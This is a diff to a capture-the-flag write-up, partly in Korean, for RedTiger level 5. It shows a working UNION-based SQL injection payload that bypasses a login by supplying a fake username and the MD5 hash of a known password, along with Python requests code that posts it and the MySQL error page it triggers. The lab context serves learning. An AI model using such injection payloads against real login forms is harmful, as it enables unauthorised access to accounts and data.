@@ -2,6 +2,8 @@
 [redtiger] level5
 ================================================================================================================
 
+|
+
 .. graphviz::
 
     digraph G {
@@ -20,32 +22,30 @@
             "server"[shape="plaintext"];
             "server" -> step1 -> step3 -> step5 -> step7 -> step9;
         }
-        step0 -> step1[label="username=' union select 'joizel','0cc175b9c0f1b6a831c399e269772661&password=a&login=Login",arrowhead="normal"];
-        step3 -> step2[label="@solve",arrowhead="normal"];
+        step0 -> step1[label="post_data: {username='&password='}",arrowhead="normal"];
+        step3 -> step2[label="Error Page",arrowhead="normal"];
+        step4 -> step5[label="post_data: {username=' union select 'joizel','0cc175b9c0f1b6a831c399e269772661&password=a&login=Login}",arrowhead="normal"];
+        step7 -> step6[label="login success",arrowhead="normal"];
     }
 
 |
 
-Source Analysis
+server -> DB 예측
 ================================================================================================================
 
-- Target: Bypass the login
 - Disabled: substring , substr, ( , ), mid
+- POST 파라미터: username, password
 - Hints: its not a blind, the password is md5-crypted, watch the login errors
 
-.. code-block:: html
+.. code-block:: sql
 
-    <form name="login" action="?mode=login" method="POST">
-        Username: <input name="username" size="30" type="text">
-        Password: <input name="password" size="30" type="text">
-    <input name="login" value="Login" type="submit">
-    </form>
-
-
+    SELECT * FROM tb_name where 
+    username='$_POST["username"]' AND 
+    password='$_POST["password"]'    
 
 |
 
-Error Page
+quote
 ================================================================================================================
 
 .. code-block:: python
@@ -71,14 +71,16 @@ Error Page
 
 .. code-block:: html
 
-    Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/hackit/level5.php on line 46
+    Warning: mysql_num_rows() expects parameter 1 to be resource, 
+    boolean given in /var/www/hackit/level5.php on line 46
     User not found!
 
 |
 
-Data Extract
+union select
 ================================================================================================================
 
+- 데이터 추출
 
 .. code-block:: python
 
@@ -104,3 +106,6 @@ Data Extract
 
     r = requests.post(url, cookies=cookies, params=params, data=payloads, verify=False)
     print r.content
+
+
+|
